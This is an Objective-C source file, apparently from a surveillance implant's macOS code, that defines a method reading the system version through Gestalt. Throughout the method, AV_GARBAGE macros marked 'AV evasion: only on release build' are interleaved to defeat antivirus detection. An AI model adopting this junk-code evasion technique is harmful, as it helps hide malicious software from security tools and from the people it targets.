/*
 * NSApplication category - Method for systemVersion
 *
 *  http://www.cocoadev.com/index.pl?DeterminingOSVersion
 *   # Cocoa Code for Gestalt
 *
 * Created by Alfredo 'revenge' Pesoli on 21/06/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "NSApplication+SystemVersion.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSApplication (SystemVersion)

- (void)getSystemVersionMajor: (u_int *)major
                        minor: (u_int *)minor
                       bugFix: (u_int *)bugFix
{
  OSErr err;
  SInt32 systemVersion, versionMajor, versionMinor, versionBugFix;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  err = Gestalt(gestaltSystemVersion, &systemVersion);  
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (err == noErr && systemVersion < 0x1040)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      if (major)
        *major = ((systemVersion & 0xF000) >> 12) * 10
                  + ((systemVersion & 0x0F00) >> 8);
    
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      if (minor)
        *minor = (systemVersion & 0x00F0) >> 4;
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      if (bugFix)
        *bugFix = (systemVersion & 0x000F);    
      
      // AV evasion: only on release build
      AV_GARBAGE_008
    }
  else
    {
      err = Gestalt(gestaltSystemVersionMajor, &versionMajor);
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      err = Gestalt(gestaltSystemVersionMinor, &versionMinor);
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      err = Gestalt(gestaltSystemVersionBugFix, &versionBugFix);
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if (err == noErr)
        {
          if (major)
            *major = versionMajor;
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          if (minor)
            *minor = versionMinor;
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          if (bugFix)
            *bugFix = versionBugFix;
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (err != noErr)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      
      if (major)
        *major = 10; 
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      if (minor)
        *minor = 0;   
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      if (bugFix)
        *bugFix = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
    }
}

@end